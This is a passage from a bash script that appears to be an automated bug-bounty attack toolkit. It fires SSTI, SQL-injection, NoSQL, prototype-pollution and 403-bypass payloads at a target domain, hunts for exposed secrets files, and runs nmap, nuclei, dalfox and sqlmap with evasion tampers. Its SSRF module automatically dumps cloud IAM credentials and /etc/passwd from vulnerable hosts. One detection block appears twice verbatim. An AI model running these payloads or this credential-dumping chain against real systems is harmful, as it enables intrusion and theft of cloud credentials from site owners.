        "{%print(7*7)%}" "{% debug %}" "{{dump(app)}}"
        '#{class.forName("java.lang.Runtime")}'
        "#{7*7}" "T(java.lang.Runtime).getRuntime().exec('id')"
    )

    while IFS= read -r url; do
        for payload in "${SSTI_PAYLOADS[@]}"; do
            local furl; furl=$(echo "$url" | qsreplace "$payload" 2>/dev/null || true)
            local resp; resp=$(_curl "$furl" 2>/dev/null | head -c 3000 || true)
            if echo "$resp" | grep -qP "\b49\b|\b7777777\b"; then
                uniq_add "$O/ssti/ssti_confirmed.txt" "SSTI_CONFIRMED: $furl (payload: $payload)"
                log_hit "SSTI CONFIRMED: $furl"
            elif echo "$resp" | grep -qiE "(template|render|jinja|twig|freemarker|velocity|smarty|mako).*error"; then
                uniq_add "$O/ssti/ssti_error.txt" "SSTI_ERROR_LEAK: $furl"
            fi
        done
    done < <(head -150 "$PARAMS_IN" 2>/dev/null)
    log_ok "SSTI confirmed: $(cnt "$O/ssti/ssti_confirmed.txt")"

    # ── Type confusion probes ─────────────────────────
    log_info "Type confusion / mass assignment probes..."
    local -a TYPE_MUTATIONS=(
        "0" "-1" "999999999" "null" "undefined" "true" "false"
        "[]" "{}" "[]" "[null]" "NaN" "Infinity" "-Infinity"
        "0.0" "1e308" "-1e308" "0x41" "0b1" "1.1.1"
        "%00" "%0a" "%0d" "\x00" "\n" "\r\n"
        "'OR 1=1--" "<script>" "{{7*7}}" "../etc/passwd"
    )

    while IFS= read -r url; do
        for mut in "${TYPE_MUTATIONS[@]}"; do
            local furl; furl=$(echo "$url" | qsreplace "$mut" 2>/dev/null || true)
            local code; code=$(_curl -o /dev/null -w "%{http_code}" "$furl" 2>/dev/null || echo "000")
            local body; body=$(_curl "$furl" 2>/dev/null | head -c 2000 || true)
            if [[ "$code" == "500" ]] || echo "$body" | grep -qiE "(stack trace|unhandled exception|typeerror|valueerror|null pointer|undefined method|cannot read property|parse error|invalid.*type|expected.*number|expected.*string)"; then
                uniq_add "$O/type_confusion/findings.txt" "TYPE_CONFUSION [${code}] (${mut}): $furl"
            fi
        done
    done < <(head -80 "$PARAMS_IN" 2>/dev/null)
    log_ok "Type confusion findings: $(cnt "$O/type_confusion/findings.txt")"

    # ── Hidden parameter discovery (ParamMiner-style ffuf) ─
    log_info "Hidden parameter discovery (ParamMiner-style ffuf)..."
    local PARAM_WL="/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"
    [[ ! -f "$PARAM_WL" ]] && PARAM_WL="/usr/share/wordlists/dirb/common.txt"

    while IFS= read -r url; do
        local base_url="${url%%\?*}"
        local s; s=$(safe_name "$url")
        _ffuf -u "${base_url}?FUZZ=bugbounty_test" \
            -w "$PARAM_WL" \
            -t 50 \
            -mc 200,201,302 \
            -fs 0 \
            -of json -o "$O/hidden_params/ffuf_get_${s}.json" \
            -s 2>/dev/null || true
        _ffuf -u "$base_url" \
            -X POST \
            -d "FUZZ=bugbounty_test" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -w "$PARAM_WL" \
            -t 50 \
            -mc 200,201,302 \
            -fs 0 \
            -of json -o "$O/hidden_params/ffuf_post_${s}.json" \
            -s 2>/dev/null || true
    done < <(head -30 "$WORKSPACE/subdomains/status_200.txt" 2>/dev/null)

    find "$O/hidden_params" -name "*.json" -size +10c 2>/dev/null \
        | xargs -I{} jq -r '.results[]?.input.FUZZ' {} 2>/dev/null \
        | sort -u > "$O/hidden_params/discovered_params.txt" || true
    log_ok "Hidden params discovered: $(cnt "$O/hidden_params/discovered_params.txt")"

    # ── JSON / XML mutation ───────────────────────────
    log_info "JSON/XML body mutation on API endpoints..."
    local API_URLS="$WORKSPACE/urls/urls_dynamic.txt"
    [[ ! -s "$API_URLS" ]] && API_URLS="$WORKSPACE/urls/urls_with_params.txt"

    local -a JSON_PAYLOADS=(
        '{"__proto__":{"admin":true}}'
        '{"constructor":{"prototype":{"admin":true}}}'
        '{"$where":"sleep(1000)"}'
        '{"$gt":"","$ne":""}'
        '{"id":{"$gt":0}}'
        '{"role":"admin","is_admin":true,"privilege":9999}'
        '{"a":"b","c":"d","e":"f","g":"h","i":"j","k":"l","m":"n","o":"p","q":"r","s":"t","u":"v","w":"x","y":"z","aa":"bb","cc":"dd","ee":"ff","gg":"hh","ii":"jj","kk":"ll","mm":"nn"}'
    )
    local -a JSON_LABELS=("prototype_pollution" "constructor_pollution" "nosqli_where" "nosqli_ne" "nosqli_gt" "mass_assign" "large_payload")

    while IFS= read -r url; do
        for i in "${!JSON_PAYLOADS[@]}"; do
            local payload="${JSON_PAYLOADS[$i]}"
            local label="${JSON_LABELS[$i]}"
            local resp_code body
            resp_code=$(_curl -X POST -H "Content-Type: application/json" \
                -d "$payload" -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || echo "000")
            body=$(_curl -X POST -H "Content-Type: application/json" \
                -d "$payload" "$url" 2>/dev/null | head -c 2000 || true)
            if [[ "$resp_code" =~ ^(200|201)$ ]] || \
               echo "$body" | grep -qiE "(admin|true|success|token|privilege|elevated|granted)"; then
                uniq_add "$O/json_xml/json_hits.txt" "JSON_MUTATION [${label}] [${resp_code}]: $url"
                log_warn "JSON mutation hit [$label]: $url"
            fi
            if [[ "$resp_code" =~ ^(200|201)$ ]] || \
               echo "$body" | grep -qiE "(admin|true|success|token|privilege|elevated|granted)"; then
                uniq_add "$O/json_xml/json_hits.txt" "JSON_MUTATION [${label}] [${resp_code}]: $url"
                log_warn "JSON mutation hit [$label]: $url"
            fi
            if echo "$body" | grep -qiE "(error|exception|stack|trace|syntax)" && [[ "$resp_code" == "500" ]]; then
                uniq_add "$O/json_xml/json_500.txt" "JSON_500 [${label}] [${resp_code}]: $url"
            fi
        done
    done < <(head -50 "$API_URLS" 2>/dev/null)
    sort -u -o "$O/json_xml/json_hits.txt" "$O/json_xml/json_hits.txt" 2>/dev/null || true
    sort -u -o "$O/json_xml/json_500.txt" "$O/json_xml/json_500.txt" 2>/dev/null || true
    log_ok "JSON mutation hits: $(cnt "$O/json_xml/json_hits.txt")"
    log_ok "Parameter mutation fuzzing complete → $O/"
}

# ══════════════════════════════════════════════════════
# MODULE 05 — PATH & ENDPOINT DISCOVERY
# ══════════════════════════════════════════════════════
mod_paths() {
    progress "MODULE 05 — Path & Endpoint Discovery"
    log_section "MODULE 05 — PATH & ENDPOINT DISCOVERY"
    local O="$WORKSPACE/paths"
    local EP="$WORKSPACE/endpoints"
    mkdir -p "$EP"

    local WL_COMMON="/usr/share/wordlists/dirb/common.txt"
    local WL_RAFT="/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt"
    local WL_API="/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt"
    local WL_MED="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
    local WL_FILES="/usr/share/seclists/Discovery/Web-Content/raft-small-files.txt"
    [[ -n "$CUSTOM_WL" && -f "$CUSTOM_WL" ]] && WL_RAFT="$CUSTOM_WL"
    [[ ! -f "$WL_RAFT"  ]] && WL_RAFT="$WL_COMMON"
    [[ ! -f "$WL_API"   ]] && WL_API="$WL_COMMON"
    [[ ! -f "$WL_MED"   ]] && WL_MED="$WL_COMMON"
    [[ ! -f "$WL_FILES" ]] && WL_FILES="$WL_COMMON"

    local MAIN="https://$DOMAIN"

    log_info "ffuf directory bruteforce (top 20 hosts, threads: $T_FFUF)..."
    head -20 "$WORKSPACE/subdomains/live_urls.txt" 2>/dev/null | while IFS= read -r target; do
        local s; s=$(safe_name "$target")
        _ffuf -u "${target}/FUZZ" \
            -w "$WL_RAFT" \
            -t "$T_FFUF" \
            -mc 200,201,204,301,302,307,401,403,405,500 \
            -of json -o "$O/ffuf_${s}.json" \
            -s 2>/dev/null || true
    done
    log_ok "ffuf complete"

    log_info "feroxbuster recursive scan (depth 4)..."
    _ffuf -u "${MAIN}/FUZZ" -w "$WL_MED" -t "$T_FFUF" \
        -mc 200,204,301,302,307,401,403,405 \
        -of json -o "$O/ferox_main.json" -s 2>/dev/null \
        || feroxbuster --url "$MAIN" \
            --wordlist "$WL_MED" \
            --threads 50 --depth 4 \
            --status-codes 200,204,301,302,307,401,403,405 \
            --auto-tune --collect-backups \
            --collect-extensions js,php,asp,aspx,jsp,json,yaml,yml,env,bak,old,txt,xml,conf \
            --output "$O/feroxbuster_main.txt" \
            --quiet 2>/dev/null || true
    log_ok "feroxbuster complete"

    log_info "API endpoint discovery..."
    _ffuf -u "${MAIN}/FUZZ" -w "$WL_API" -t "$T_FFUF" \
        -mc 200,201,204,301,302,401,403,405 \
        -of json -o "$O/ffuf_api.json" -s 2>/dev/null || true

    log_info "Backup & sensitive file check..."
    _ffuf -u "${MAIN}/FUZZ" -w "$WL_FILES" -t "$T_FFUF" \
        -mc 200,301,302 \
        -of json -o "$O/ffuf_backups.json" -s 2>/dev/null || true

    cat "$O/ffuf_"*.json 2>/dev/null \
        | jq -r '.results[]?.url' 2>/dev/null \
        | sort -u > "$EP/ffuf_found.txt" || true
    grep -oE 'https?://[^ ]+' "$O/feroxbuster_main.txt" 2>/dev/null \
        | sort -u > "$EP/feroxbuster_found.txt" || true

    # ── 403 Bypass ────────────────────────────────────────
    log_info "403 bypass (16 path + header techniques)..."
    local bypass_out="$O/403_bypass.txt"
    while IFS= read -r url; do
        local path base
        path=$(echo "$url" | grep -oP "(?<=${DOMAIN}).*" || true)
        base=$(echo "$url" | grep -oP 'https?://[^/]+' || true)
        [[ -z "$path" || -z "$base" ]] && continue

        for trick in \
            "${path}%2e" "/${path}" "//${path}" "${path}/." \
            "${path}/.." "/%2f${path}" "${path}%20" "${path}%09" \
            "/.${path}" "${path}..;/" "/${path}?x" \
            "${path}/./" "/${path}%3f" "${path}#" "/%2e${path}"; do
            local c; c=$(_curl -o /dev/null -w "%{http_code}" "${base}${trick}" 2>/dev/null || echo "000")
            [[ "$c" == "200" ]] && uniq_add "$bypass_out" "PATH_BYPASS [$c]: ${base}${trick}"
        done

        for hdr in \
            "X-Original-URL: $path" \
            "X-Rewrite-URL: $path" \
            "X-Override-URL: $path" \
            "X-Forwarded-For: 127.0.0.1" \
            "X-Real-IP: 127.0.0.1" \
            "X-Custom-IP-Authorization: 127.0.0.1" \
            "CF-Connecting-IP: 127.0.0.1" \
            "X-Host: localhost" \
            "Referer: ${base}${path}" \
            "X-Forwarded-Host: localhost"; do
            local c; c=$(_curl -o /dev/null -w "%{http_code}" -H "$hdr" "$url" 2>/dev/null || echo "000")
            [[ "$c" == "200" ]] && uniq_add "$bypass_out" "HEADER_BYPASS [$c] ($hdr): $url"
        done
    done < "$WORKSPACE/paths/403_targets.txt" 2>/dev/null
    sort -u -o "$bypass_out" "$bypass_out" 2>/dev/null || true
    [[ -s "$bypass_out" ]] && log_hit "403 BYPASSES: $(cnt "$bypass_out") found!"

    log_info "Arjun hidden parameter discovery (top 50 endpoints)..."
    head -50 "$WORKSPACE/subdomains/status_200.txt" 2>/dev/null | while IFS= read -r url; do
        local s; s=$(safe_name "$url")
        arjun -u "$url" -oJ "$WORKSPACE/params/arjun_${s}.json" -t 20 -q 2>/dev/null || true
    done
    cat "$WORKSPACE/params/arjun_"*.json 2>/dev/null \
        | jq -r '.params[]?' 2>/dev/null | sort -u \
        >> "$WORKSPACE/params/all_params.txt" || true
    sort -u -o "$WORKSPACE/params/all_params.txt" "$WORKSPACE/params/all_params.txt" 2>/dev/null || true

    cat "$EP/ffuf_found.txt" "$EP/feroxbuster_found.txt" \
        "$WORKSPACE/js/all_js_endpoints.txt" \
        "$WORKSPACE/urls/katana.txt" 2>/dev/null | sort -u > "$EP/all_endpoints.txt"
    log_ok "Total discovered endpoints: $(cnt "$EP/all_endpoints.txt")"

    grep -iE "(admin|api/v[0-9]|graphql|swagger|actuator|debug|backup|config|secret|key|token|login|auth|dashboard|panel|manage|internal|dev|test|staging|upload|download|export|import|reset|forgot|webhook|payment|oauth|oidc|saml|sso|\.env|\.git|phpinfo|server-status|metrics|prometheus)" \
        "$EP/all_endpoints.txt" 2>/dev/null | sort -u > "$EP/interesting_paths.txt"
    log_ok "Interesting paths flagged: $(cnt "$EP/interesting_paths.txt")"
}

# ══════════════════════════════════════════════════════
# MODULE 06 — PORT SCAN
# ══════════════════════════════════════════════════════
mod_ports() {
    [[ "$F_QUICK" == true ]] && return
    progress "MODULE 06 — Port Scan"
    log_section "MODULE 06 — NMAP PORT SCAN"
    local O="$WORKSPACE/subdomains"

    [[ ! -s "$O/resolved_domains.txt" ]] && { log_warn "No resolved hosts for port scan"; return; }
    log_info "nmap top-1000 on $(cnt "$O/resolved_domains.txt") hosts..."
    nmap -iL "$O/resolved_domains.txt" \
        --top-ports 1000 -T4 --open \
        -sV --version-intensity 3 \
        -oN "$O/nmap_scan.txt" \
        -oG "$O/nmap_grep.txt" 2>/dev/null || true
    log_ok "nmap complete → $O/nmap_scan.txt"

    grep "open" "$O/nmap_grep.txt" 2>/dev/null \
        | grep -E "(21|22|23|25|110|143|161|389|445|3306|5432|5900|6379|8080|8443|9200|11211|27017)" \
        | sort -u > "$O/interesting_ports.txt" || true
    [[ -s "$O/interesting_ports.txt" ]] && log_warn "Interesting ports: $(cnt "$O/interesting_ports.txt") (review $O/interesting_ports.txt)"
}

# ══════════════════════════════════════════════════════
# MODULE 07 — SENSITIVE FILE EXPOSURE
# ══════════════════════════════════════════════════════
mod_exposure() {
    progress "MODULE 07 — Sensitive File Exposure"
    log_section "MODULE 07 — SENSITIVE FILE & EXPOSURE CHECK"
    local O="$WORKSPACE/vulns/misconfig"

    local -a PATHS=(
        "/.env" "/.env.local" "/.env.production" "/.env.staging" "/.env.bak"
        "/.git/config" "/.git/HEAD" "/.git/COMMIT_EDITMSG"
        "/config.php" "/config.yml" "/config.yaml" "/config.json"
        "/wp-config.php" "/wp-config.php.bak"
        "/database.yml" "/database.json" "/db.json"
        "/docker-compose.yml" "/.dockerenv" "/Dockerfile"
        "/package.json" "/package-lock.json" "/yarn.lock"
        "/composer.json" "/composer.lock"
        "/phpinfo.php" "/info.php" "/test.php"
        "/server-status" "/server-info" "/.htpasswd" "/.htaccess"
        "/actuator" "/actuator/env" "/actuator/beans" "/actuator/heapdump"
        "/actuator/mappings" "/actuator/logfile"
        "/metrics" "/health" "/status" "/debug" "/trace"
        "/api/swagger.json" "/swagger.json" "/api-docs"
        "/swagger-ui.html" "/swagger-ui/" "/redoc" "/openapi.json"
        "/.DS_Store" "/thumbs.db"
        "/backup.sql" "/dump.sql" "/database.sql" "/backup.zip"
        "/crossdomain.xml" "/clientaccesspolicy.xml"
        "/robots.txt" "/sitemap.xml" "/security.txt" "/.well-known/security.txt"
        "/.aws/credentials" "/credentials.json"
        "/.bash_history" "/web.config"
    )

    log_info "Checking ${#PATHS[@]} sensitive paths on top 15 live hosts..."
    while IFS= read -r base; do
        for path in "${PATHS[@]}"; do
            local url="${base}${path}"
            local code; code=$(_curl -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || echo "000")
            if [[ "$code" == "200" ]]; then
                local sz; sz=$(_curl -o /dev/null -w "%{size_download}" "$url" 2>/dev/null || echo "0")
                if [[ "$sz" -gt 10 ]] 2>/dev/null; then
                    uniq_add "$O/sensitive_files.txt" "EXPOSED [$code] [${sz}b]: $url"
                    log_hit "EXPOSED: $url (${sz} bytes)"
                fi
            fi
        done
    done < <(head -15 "$WORKSPACE/subdomains/live_urls.txt" 2>/dev/null)
    sort -u -o "$O/sensitive_files.txt" "$O/sensitive_files.txt" 2>/dev/null || true

    [[ -s "$O/sensitive_files.txt" ]] && \
        log_hit "SENSITIVE FILES: $(cnt "$O/sensitive_files.txt") exposed!"
    log_ok "Exposure check complete"
}

# ══════════════════════════════════════════════════════
# MODULE 08 — NUCLEI
# ══════════════════════════════════════════════════════
mod_nuclei() {
    progress "MODULE 08 — Nuclei Vulnerability Scan"
    log_section "MODULE 08 — NUCLEI AUTOMATED VULNERABILITY SCAN"
    local O="$WORKSPACE/vulns/nuclei"
    local LIVE="$WORKSPACE/subdomains/live_urls.txt"
    local PARAMS="$WORKSPACE/urls/urls_with_params.txt"

    mkdir -p "$O" 2>/dev/null || true
    touch "$O/nuclei_full.txt" "$O/nuclei_full.json" "$O/nuclei_critical_high.txt" \
          "$O/nuclei_params.txt" "$O/nuclei_cves.txt" "$O/nuclei_misconfig.txt" \
          "$O/nuclei_takeover.txt" 2>/dev/null || true
    log_info "Updating nuclei templates..."
    nuclei -update-templates -silent 2>/dev/null || true

    log_info "Nuclei FULL scan (threads: $T_NUCLEI, rate: $R_NUCLEI/s)..."
    _nuclei -list "$LIVE" \
        -t "$HOME/nuclei-templates" \
        -severity critical,high,medium,low,info \
        -tags "cve,rce,sqli,xss,lfi,ssrf,idor,auth,misconfig,exposure,token,default-login,panel,backup,debug,takeover" \
        -c "$T_NUCLEI" -rate-limit "$R_NUCLEI" \
        -timeout "$TIMEOUT_CONN" -retries 2 \
        -follow-redirects -stats \
        -json-export "$O/nuclei_full.json" \
        -o "$O/nuclei_full.txt" 2>/dev/null || true
    sort -u -o "$O/nuclei_full.txt" "$O/nuclei_full.txt" 2>/dev/null || true
    log_ok "Nuclei full: $(cnt "$O/nuclei_full.txt") findings"

    jq -r 'select(.info.severity=="critical" or .info.severity=="high")
        | "[\(.info.severity|ascii_upcase)] [\(.info.name)] \(.host)"' \
        "$O/nuclei_full.json" 2>/dev/null | sort -u > "$O/nuclei_critical_high.txt" || true
    [[ -s "$O/nuclei_critical_high.txt" ]] && \
        log_hit "NUCLEI Critical/High: $(cnt "$O/nuclei_critical_high.txt") findings!"

    log_info "Nuclei DAST on parameterized URLs..."
    _nuclei -list "$PARAMS" \
        -t "$HOME/nuclei-templates/dast" \
        -t "$HOME/nuclei-templates/vulnerabilities" \
        -c 30 -rate-limit 100 \
        -json-export "$O/nuclei_params.json" \
        -o "$O/nuclei_params.txt" -silent 2>/dev/null || true
    sort -u -o "$O/nuclei_params.txt" "$O/nuclei_params.txt" 2>/dev/null || true

    log_info "CVE-targeted scan..."
    _nuclei -list "$LIVE" -tags cve \
        -c "$T_NUCLEI" -rate-limit 100 \
        -json-export "$O/nuclei_cves.json" \
        -o "$O/nuclei_cves.txt" -silent 2>/dev/null || true
    sort -u -o "$O/nuclei_cves.txt" "$O/nuclei_cves.txt" 2>/dev/null || true
    log_ok "CVE findings: $(cnt "$O/nuclei_cves.txt")"

    log_info "Misconfiguration scan..."
    _nuclei -list "$LIVE" \
        -tags "misconfig,exposure,panel,default-login,backup,debug,config" \
        -c "$T_NUCLEI" -o "$O/nuclei_misconfig.txt" -silent 2>/dev/null || true
    sort -u -o "$O/nuclei_misconfig.txt" "$O/nuclei_misconfig.txt" 2>/dev/null || true
    log_ok "Misconfig findings: $(cnt "$O/nuclei_misconfig.txt")"

    log_info "Takeover check..."
    _nuclei -list "$LIVE" -tags takeover \
        -o "$O/nuclei_takeover.txt" -silent 2>/dev/null || true
    sort -u -o "$O/nuclei_takeover.txt" "$O/nuclei_takeover.txt" 2>/dev/null || true
    [[ -s "$O/nuclei_takeover.txt" ]] && \
        log_hit "Subdomain takeovers: $(cnt "$O/nuclei_takeover.txt")"
}

# ══════════════════════════════════════════════════════
# MODULE 09 — XSS
# ══════════════════════════════════════════════════════
mod_xss() {
    [[ "$F_NO_EXPLOIT" == true ]] && return
    progress "MODULE 09 — XSS Detection"
    log_section "MODULE 09 — XSS (dalfox)"
    local O="$WORKSPACE/vulns/xss"

    mkdir -p "$O" 2>/dev/null || true
    touch "$O/dalfox_results.txt" "$O/no_csp.txt" "$O/csp_present.txt" 2>/dev/null || true
    local XSS_IN="$WORKSPACE/urls/gf/xss.txt"
    [[ ! -s "$XSS_IN" ]] && XSS_IN="$WORKSPACE/urls/urls_with_params.txt"

    # Live-filter first — no WAF-blocked/junk targets reach dalfox
    active_filter "$XSS_IN" /tmp/dalfox_input_$$.txt 300
    local dalfox_count; dalfox_count=$(wc -l < /tmp/dalfox_input_$$.txt 2>/dev/null || echo 0)
    [[ "$dalfox_count" -gt 500 ]] && head -500 /tmp/dalfox_input_$$.txt > /tmp/dalfox_cap_$$.txt \
        && mv /tmp/dalfox_cap_$$.txt /tmp/dalfox_input_$$.txt
    log_info "dalfox (workers: $T_DALFOX, urls: $dalfox_count, timeout: 300s total)..."
    timeout 300 dalfox file "/tmp/dalfox_input_$$.txt" \
        --silence --skip-bav --no-color \
        --worker "$T_DALFOX" \
        --timeout 5 \
        --delay 0 \
        --only-discovery \
        ${SESSION_COOKIE:+--cookie "$SESSION_COOKIE"} \
        ${PROXY_URL:+--proxy "$PROXY_URL"} \
        --output "$O/dalfox_results.txt" \
        --format json 2>/dev/null || true
    rm -f /tmp/dalfox_input_$$.txt
    sort -u -o "$O/dalfox_results.txt" "$O/dalfox_results.txt" 2>/dev/null || true
    [[ -s "$O/dalfox_results.txt" ]] && log_hit "XSS: $(cnt "$O/dalfox_results.txt") hits!"

    log_info "CSP header check on live hosts..."
    while IFS= read -r url; do
        local csp; csp=$(_curl -I "$url" 2>/dev/null | grep -i "content-security-policy" | head -1)
        if [[ -z "$csp" ]]; then
            uniq_add "$O/no_csp.txt" "NO_CSP: $url"
        else
            uniq_add "$O/csp_present.txt" "$url | $csp"
        fi
    done < "$WORKSPACE/subdomains/live_urls.txt" 2>/dev/null || true
    log_ok "No CSP: $(cnt "$O/no_csp.txt") hosts"
    log_ok "XSS scan complete"
}

# ══════════════════════════════════════════════════════
# MODULE 10 — SQLi
# ══════════════════════════════════════════════════════
mod_sqli() {
    [[ "$F_NO_EXPLOIT" == true ]] && return
    progress "MODULE 10 — SQLi Detection"
    log_section "MODULE 10 — SQL INJECTION (sqlmap)"
    local O="$WORKSPACE/vulns/sqli"
    mkdir -p "$O/sqlmap_active" 2>/dev/null || true
    local SQLI_IN="$WORKSPACE/urls/gf/sqli.txt"
    local PARAM_IN="$WORKSPACE/urls/urls_with_params.txt"

    log_info "SQLi: live-checking URLs to find active targets..."
    active_filter "$SQLI_IN"  "/tmp/sqli_gf_$$.txt"  30
    active_filter "$PARAM_IN" "/tmp/sqli_par_$$.txt" 20
    cat /tmp/sqli_gf_$$.txt /tmp/sqli_par_$$.txt 2>/dev/null | sort -u > /tmp/sqli_final_$$.txt
    local sqli_count; sqli_count=$(wc -l < /tmp/sqli_final_$$.txt 2>/dev/null || echo 0)

    if [[ "$sqli_count" -eq 0 ]]; then
        log_warn "No active SQLi targets found — skipping sqlmap"
        rm -f /tmp/sqli_gf_$$.txt /tmp/sqli_par_$$.txt /tmp/sqli_final_$$.txt
        return
    fi

    log_info "sqlmap on $sqli_count active URLs (timeout: 600s, fully automated)..."
    timeout 600 sqlmap \
        -m "/tmp/sqli_final_$$.txt" \
        --batch \
        --level=2 --risk=1 \
        --random-agent \
        --threads=5 \
        --timeout=10 \
        --retries=1 \
        --tamper=space2comment,between,randomcase \
        --no-cast \
        --smart \
        --skip=User-Agent,Referer,Host \
        --ignore-code=403 \
        --answers="follow=N,sitemap=N,reduce=Y,store=N,normalize=Y,proceed=C,test=Y,try=Y,cookie=N,redirect=N,integer=Y" \
        ${SESSION_COOKIE:+--cookie="$SESSION_COOKIE"} \
        ${PROXY_URL:+--proxy="$PROXY_URL"} \
        --output-dir="$O/sqlmap_active" 2>/dev/null || true

    rm -f /tmp/sqli_gf_$$.txt /tmp/sqli_par_$$.txt /tmp/sqli_final_$$.txt

    find "$O" -name "*.csv" -size +0c 2>/dev/null | while IFS= read -r f; do
        grep -v "^Target" "$f" | grep -v "^$" | while IFS= read -r line; do
            uniq_add "$O/sqli_findings.txt" "SQLi: $line"
            log_hit "SQLi: $line"
        done
    done
    log_ok "SQLi scan complete → $O/"
}
# ══════════════════════════════════════════════════════
# MODULE 11 — SSRF  (detect + auto-exploit metadata/file/localhost)
# ══════════════════════════════════════════════════════
mod_ssrf() {
    [[ "$F_NO_EXPLOIT" == true ]] && return
    progress "MODULE 11 — SSRF"
    log_section "MODULE 11 — SSRF DETECTION + AUTO-EXPLOIT"
    local O="$WORKSPACE/vulns/ssrf"
    mkdir -p "$O/meta" 2>/dev/null || true
    local SSRF_IN="$WORKSPACE/urls/gf/ssrf.txt"
    [[ ! -s "$SSRF_IN" ]] && SSRF_IN="$WORKSPACE/urls/urls_with_params.txt"
    [[ ! -s "$SSRF_IN" ]] && SSRF_IN="$WORKSPACE/urls/urls_dynamic.txt"

    active_filter "$SSRF_IN" /tmp/ssrf_in_$$.txt 60
    local ssrf_total; ssrf_total=$(wc -l < /tmp/ssrf_in_$$.txt 2>/dev/null || echo 0)
    log_info "SSRF: testing $ssrf_total live URLs (in-band + OOB + time-based)"

    # ── Internal IP / metadata payloads ────────────────
    local -a SSRF_HOSTS=(
        "127.0.0.1" "localhost" "0.0.0.0" "::1" "[::1]"
        "2130706433" "0x7f000001" "0177.0.0.1" "127.1" "017700000001"
        "169.254.169.254" "0xA9FEA9FE" "2852039166"
        "10.0.0.1" "10.255.255.1" "172.16.0.1" "192.168.1.1"
    )
    local -a SSRF_PATHS=(
        "/latest/meta-data/" "/latest/meta-data/iam/security-credentials/"
        "/latest/meta-data/iam/security-credentials/admin"
        "/latest/user-data/" "/latest/dynamic/instance-identity/document"
        "/" "/robots.txt" "/server-status"
    )

    while IFS= read -r url; do
        local base="${url%%\?*}"
        # baseline
        local t0; t0=$(date +%s%N)
        local base_body; base_body=$(_curl "$url" 2>/dev/null | head -c 1500 || true)
        local t1; t1=$(date +%s%N)
        local base_ms=$(( (t1 - t0) / 1000000 ))
        local base_hash; base_hash=$(echo "$base_body" | md5sum | cut -d' ' -f1)

        for host in "${SSRF_HOSTS[@]}"; do
            for path in "${SSRF_PATHS[@]}"; do
                local payload="http://${host}${path}"
                local furl; furl=$(echo "$url" | qsreplace "$payload" 2>/dev/null || true)
                [[ "$furl" == "$url" ]] && continue
                local body code sz
                body=$(_curl "$furl" 2>/dev/null | head -c 3000 || true)
                code=$(_curl -o /dev/null -w "%{http_code}" "$furl" 2>/dev/null || echo "000")
                sz=${#body}

                # in-band: metadata / internal content
                if echo "$body" | grep -qiE "(ami-id|instance-id|meta-data|security-credentials|AccessKeyId|SecretAccessKey|Token|accountId|availabilityZone)"; then
                    uniq_add "$O/ssrf_confirmed.txt" "SSRF_METADATA [${code}]: $furl"
                    log_hit "SSRF → CLOUD METADATA: $furl"
                    echo "$body" > "$O/meta/$(safe_name "$furl").body"
                    continue
                fi
                if echo "$body" | grep -qiE "(root:x:0:0|/bin/bash|uid=|/etc/passwd)"; then
                    uniq_add "$O/ssrf_confirmed.txt" "SSRF_FILE [${code}]: $furl"
                    log_hit "SSRF → FILE READ: $furl"
                    echo "$body" > "$O/meta/$(safe_name "$furl").body"
                    continue
                fi
                # error oracle: internal port/service behavior
                if echo "$body" | grep -qiE "(connection refused|no route to host|failed to connect|name or service not known|timed out|tcp|socket)"; then
                    uniq_add "$O/ssrf_error_oracle.txt" "SSRF_ORACLE [${code}] (${host}${path}): $furl"
                fi
                # divergence heuristic
                if [[ "$code" =~ ^(200|301|302)$ ]] && [[ "$sz" -gt 0 ]] && \
                   [[ "$(echo "$body" | md5sum | cut -d' ' -f1)" != "$base_hash" ]]; then
                    uniq_add "$O/ssrf_divergence.txt" "SSRF_DIVERGENCE [${code}] [${sz}b] (${host}${path}): $furl"
                fi
            done
        done

        # ── time-based probe: unroutable internal → delay ──
        local slow_furl; slow_furl=$(echo "$url" | qsreplace "http://10.255.255.1:81/" 2>/dev/null || true)
        local t2; t2=$(date +%s%N)
        _curl --connect-timeout 8 --max-time 12 "$slow_furl" >/dev/null 2>&1 || true
        local t3; t3=$(date +%s%N)
        local slow_ms=$(( (t3 - t2) / 1000000 ))
        if [[ "$slow_ms" -gt $(( base_ms + 3000 )) ]] && [[ "$slow_ms" -gt 4000 ]]; then
            uniq_add "$O/ssrf_timebased.txt" "SSRF_TIMEBASED [${slow_ms}ms vs base ${base_ms}ms]: $furl"
            log_warn "SSRF time-based candidate: $furl"
        fi

        # ── OOB (interactsh configured via env) ──────────
        if [[ -n "${INTERACTSH_DOMAIN:-}" ]]; then
            local rand; rand=$(head -c 6 /dev/urandom | xxd -p | head -1)
            local oob="http://${rand}.${INTERACTSH_DOMAIN}/"
            local oob_url; oob_url=$(echo "$url" | qsreplace "$oob" 2>/dev/null || true)
            _curl --max-time 6 "$oob_url" >/dev/null 2>&1 || true
            uniq_add "$O/oob_payloads_sent.txt" "OOB_SSRF [${rand}.${INTERACTSH_DOMAIN}]: $oob_url"
        fi
    done < /tmp/ssrf_in_$$.txt
    rm -f /tmp/ssrf_in_$$.txt

    # ── AUTO-EXPLOIT chain: confirmed metadata/file readers ──
    if [[ -s "$O/ssrf_confirmed.txt" ]]; then
        log_hit "SSRF CONFIRMED: $(cnt "$O/ssrf_confirmed.txt") → auto-dumping metadata + /etc/passwd"
        while IFS= read -r line; do
            local target; target=$(echo "$line" | grep -oP 'https?://\S+$' || true)
            [[ -z "$target" ]] && continue
            local s; s=$(safe_name "$target")
            local meta; meta=$(echo "$target" | sed 's|http://[^/]*|http://169.254.169.254|')
            local dump
            dump=$(_curl "$meta/latest/meta-data/iam/security-credentials/" 2>/dev/null | head -c 4000 || true)
            [[ -n "$dump" ]] && { echo "### $target" >> "$O/iam_creds.txt"; echo "$dump" >> "$O/iam_creds.txt"; log_hit "IAM creds dumped for $target"; }
            local pfile; pfile=$(echo "$target" | sed 's|http://[^/]*|file:///etc/passwd|')
            local pb; pb=$(_curl "$pfile" 2>/dev/null | head -c 2000 || true)
            [[ -n "$pb" ]] && { echo "### $target" >> "$O/passwd_dump.txt"; echo "$pb" >> "$O/passwd_dump.txt"; log_hit "/etc/passwd dumped for $target"; }
        done < "$O/ssrf_confirmed.txt"
    fi

